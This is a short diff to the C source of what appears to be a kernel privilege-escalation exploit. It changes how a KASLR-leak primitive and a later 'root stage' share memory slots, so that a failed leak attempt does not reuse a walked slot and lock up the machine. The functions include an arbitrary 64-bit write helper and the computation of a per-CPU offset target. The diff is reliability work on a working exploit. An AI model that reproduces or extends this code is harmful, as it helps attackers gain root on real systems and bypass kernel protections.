@@ -114,6 +114,11 @@ static int eqs_dbg_pselect_ret = -1;
 static int eqs_dbg_pselect_errno;
 
 static unsigned eqs_slot_rot;
+/* Monotonic zero-slot consumer for this process: the leak takes one per attempt
+ * and stage-2 continues from wherever it stopped, so a slot that a failed leak
+ * attempt already walked is never handed out again (reusing a walked slot across
+ * processes dereferences a dead kernel stack -> hard lockup). */
+static int eqs_next_slot_idx;
 static uint64_t eqs_kaslr_base;
 static uint64_t eqs_kaslr_slide;
 
@@ -677,8 +682,7 @@ static int eqs_write64(uintptr_t target, uintptr_t value, const char *name,
 }
 
 uint64_t slide_read_stext(void) {
-  int idx = 0;
-  int slot = idx++;
+  int slot = eqs_next_slot_idx++;
   if (!eqs_fork_op(1, 0, SLIDE_RANDOM_BOOT_ID_DATA, SLIDE_LOGGERS_0_1, slot,
                    NULL)) {
     pr_warning("eqs leak primitive did not trigger\n");
@@ -798,7 +802,7 @@ int slide_eqs_root_stage(void) {
              cpu, want_cpu, getpid(), getuid(),
              (unsigned long long)eqs_kaslr_base);
 
-  int idx = 1; /* slot 0 is consumed by the KASLR leak */
+  int idx = eqs_next_slot_idx; /* continue after the slots the leak consumed */
 
   uintptr_t percpu_slot = (uintptr_t)eqs_kaslr_base + EQS_OFF_PER_CPU_OFFSET +
                           (uintptr_t)cpu * sizeof(uint64_t);
